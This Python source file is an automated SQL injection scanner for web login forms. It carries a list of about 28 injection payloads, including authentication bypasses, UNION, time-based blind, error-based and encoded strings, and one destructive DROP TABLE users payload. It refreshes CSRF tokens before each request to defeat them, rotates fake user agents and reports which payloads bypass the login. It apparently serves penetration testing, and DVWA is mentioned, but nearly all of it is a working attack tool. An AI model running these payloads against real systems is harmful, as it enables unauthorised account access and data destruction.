import requests
import time
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from rich.console import Console
from rich.table import Table
from core.config import TARGET_TIMEOUT, SESSION_DELAY
from core.logger import logger

console = Console()
ua = UserAgent()

SQLI_PAYLOADS = [
    # ── Classic auth bypass ──
    ("' OR '1'='1",                                         "classic bypass"),
    ("' OR '1'='1' --",                                     "comment bypass"),
    ("' OR '1'='1' #",                                      "MySQL hash comment"),
    ("' OR 1=1 --",                                         "numeric bypass"),
    ("admin' --",                                           "admin direct"),
    ("admin'#",                                             "admin MySQL"),
    ("') OR ('1'='1",                                       "bracket bypass"),
    ("') OR ('1'='1'--",                                    "bracket + comment"),
    # ── UNION based ──
    ("' UNION SELECT 1,1 --",                               "union 2-col"),
    ("' UNION SELECT 1,1,1 --",                             "union 3-col"),
    ("' UNION SELECT null,null --",                         "union null"),
    # ── Time-based blind ──
    ("' OR SLEEP(3) --",                                    "MySQL time blind"),
    ("'; WAITFOR DELAY '0:0:3'--",                          "MSSQL time blind"),
    ("' OR pg_sleep(3) --",                                 "PostgreSQL time blind"),
    ("1; SELECT SLEEP(3) --",                               "stacked time blind"),
    # ── Error-based ──
    ("'",                                                   "single quote error"),
    ("''",                                                  "double single quote"),
    ("' OR 1=CONVERT(int,'a')--",                          "MSSQL error based"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",    "MySQL extractvalue"),
    # ── Alternative / encoded ──
    ("' || '1'='1",                                         "Oracle bypass"),
    ("\" OR \"\"=\"",                                       "double-quote bypass"),
    ("' OR 'unusual'='unusual",                             "unusual string bypass"),
    ("'; DROP TABLE users; --",                             "destructive test"),
    ("1' AND 1=1 --",                                       "AND true conditional"),
    ("1' AND 1=2 --",                                       "AND false conditional"),
    ("' AND '1'='1",                                        "AND quote bypass"),
    ("%27 OR %271%27=%271",                                 "URL-encoded bypass"),
    ("0x27 OR 0x3127 = 0x3127",                             "hex bypass"),
]


# ─────────────────────────────────────────────────────────────────────────────
# CORE FIX: fresh token fetcher
# ─────────────────────────────────────────────────────────────────────────────
def _fetch_fresh_token(session: requests.Session, target: dict) -> dict:
    """
    GETs the login page fresh, parses all hidden fields (including CSRF token),
    and returns them ready to merge into the POST data.
    This is called before EVERY single request — this is what makes it XBOW-grade.
    """
    try:
        resp = session.get(
            target["source_page"],
            timeout=TARGET_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        soup = BeautifulSoup(resp.text, "lxml")
        fresh_fields = {}
        for inp in soup.find_all("input", {"type": "hidden"}):
            name  = inp.get("name", "")
            value = inp.get("value", "")
            if name:
                fresh_fields[name] = value
        return fresh_fields
    except Exception as e:
        logger.warning(f"Token refresh failed: {e}")
        # Fall back to the stale token from the crawl — better than crashing
        return target.get("extra_fields", {})


def _get_baseline(session: requests.Session, target: dict) -> dict:
    """Baseline with a fresh token so the comparison is valid."""
    fresh = _fetch_fresh_token(session, target)
    try:
        data = {
            target["username_field"]: "__xauth_baseline__",
            target["password_field"]: "__xauth_baseline__",
            **fresh,
        }
        resp = session.post(
            target["action"], data=data,
            timeout=TARGET_TIMEOUT, verify=False, allow_redirects=True,
        )
        return {
            "status_code": resp.status_code,
            "body_length": len(resp.text),
            "body_lower":  resp.text.lower()[:800],
            "final_url":   resp.url,
        }
    except Exception as e:
        logger.warning(f"Baseline failed: {e}")
        return {"status_code": 200, "body_length": 1, "body_lower": "", "final_url": ""}


def _try_payload(session, target, payload, category, baseline) -> dict:
    # ── KEY CHANGE: fetch a fresh CSRF token before every single attempt ──
    fresh_fields = _fetch_fresh_token(session, target)

    data = {
        target["username_field"]: payload,
        target["password_field"]: "xauth_sqli_test",
        **fresh_fields,   # always fresh, never stale
    }

    try:
        t0   = time.time()
        resp = session.post(
            target["action"], data=data,
            timeout=TARGET_TIMEOUT + 5,
            allow_redirects=True, verify=False,
        )
        elapsed = time.time() - t0
        vulnerable, evidence = _analyse_response(resp, baseline, elapsed, payload)
        return {
            "payload":     payload,
            "category":    category,
            "status_code": resp.status_code,
            "elapsed_sec": round(elapsed, 2),
            "vulnerable":  vulnerable,
            "evidence":    evidence,
        }
    except requests.exceptions.Timeout:
        is_time_based = any(
            k in payload.upper() for k in ("SLEEP", "WAITFOR", "PG_SLEEP")
        )
        return {
            "payload":     payload,
            "category":    category,
            "status_code": 0,
            "elapsed_sec": TARGET_TIMEOUT + 5,
            "vulnerable":  is_time_based,
            "evidence":    "timeout — time-based injection confirmed" if is_time_based else "connection timeout",
        }
    except Exception as e:
        return {
            "payload": payload, "category": category,
            "status_code": 0, "elapsed_sec": 0,
            "vulnerable": False, "evidence": str(e),
        }


def _analyse_response(resp, baseline, elapsed, payload) -> tuple:
    body = resp.text.lower()

    failure_kw = {
        "invalid", "incorrect", "wrong", "failed", "error",
        "denied", "unauthorized", "bad credentials", "login failed",
    }
    success_kw = {
        "dashboard", "welcome", "logout", "profile",
        "account", "success", "logged in", "dvwa",
    }

    # Signal 1: time-based blind
    if elapsed > 2.5 and any(
        k in payload.upper() for k in ("SLEEP", "WAITFOR", "PG_SLEEP")
    ):
        return True, f"response delayed {elapsed:.1f}s — time injection confirmed"

    # Signal 2: redirect to known success path
    if resp.url != baseline["final_url"]:
        if any(kw in resp.url.lower() for kw in ("dashboard","home","welcome","index","main","dvwa")):
            return True, f"redirected to {resp.url}"

    # Signal 3: success keywords appeared that were not in baseline
    if any(kw in body for kw in success_kw):
        if not any(kw in baseline["body_lower"] for kw in success_kw):
            return True, "success keyword appeared — login bypassed"

    # Signal 4: failure keywords vanished
    if any(kw in baseline["body_lower"] for kw in failure_kw):
        if not any(kw in body for kw in failure_kw):
            return True, "login-failure text disappeared — bypass confirmed"

    # Signal 5: body length changed significantly
    base_len = baseline["body_length"] or 1
    ratio    = abs(len(resp.text) - base_len) / base_len
    if ratio > 0.30 and resp.status_code == 200:
        return True, f"body length changed {ratio:.0%} — different page served"

    return False, "no indicators"


def test_sqli(target: dict) -> dict:
    session = requests.Session()
    session.headers["User-Agent"] = ua.random

    baseline = _get_baseline(session, target)
    results  = []
    vuln_count = 0

    console.print(f"\n[bold red]SQLi scan:[/bold red] {target['action']}")
    console.print(
        f"[dim]{len(SQLI_PAYLOADS)} payloads | "
        f"CSRF-aware (fresh token per request) | "
        f"user field: '{target['username_field']}'[/dim]\n"
    )

    for payload, category in SQLI_PAYLOADS:
        result = _try_payload(session, target, payload, category, baseline)
        results.append(result)

        if result["vulnerable"]:
            vuln_count += 1
            console.print(
                f"  [bold red]VULNERABLE[/bold red]  "
                f"[dim][{category}][/dim]  "
                f"[yellow]{payload[:50]}[/yellow]  "
                f"→ {result['evidence']}"
            )
        else:
            console.print(
                f"  [dim green]safe[/dim green]  "
                f"[dim][{category}] {payload[:45]}...[/dim]"
            )

        time.sleep(SESSION_DELAY)

    # Summary table
    vulns = [r for r in results if r["vulnerable"]]
    if vulns:
        table = Table(title="SQLi confirmed vulnerabilities", border_style="red")
        table.add_column("Category",    style="yellow")
        table.add_column("Payload",     style="cyan",  max_width=45)
        table.add_column("Status",      style="magenta")
        table.add_column("Evidence",    style="white")
        for v in vulns:
            table.add_row(v["category"], v["payload"], str(v["status_code"]), v["evidence"])
        console.print(table)
        console.print(f"\n[bold red]{vuln_count} SQLi vulnerabilities confirmed.[/bold red]\n")
    else:
        console.print("\n[green]No SQLi vulnerabilities confirmed on this target.[/green]\n")

    return {
        "target":          target["action"],
        "attack_type":     "sql_injection",
        "payloads_tested": len(SQLI_PAYLOADS),
        "vulnerable":      vuln_count > 0,
        "vuln_count":      vuln_count,
        "results":         results,
    }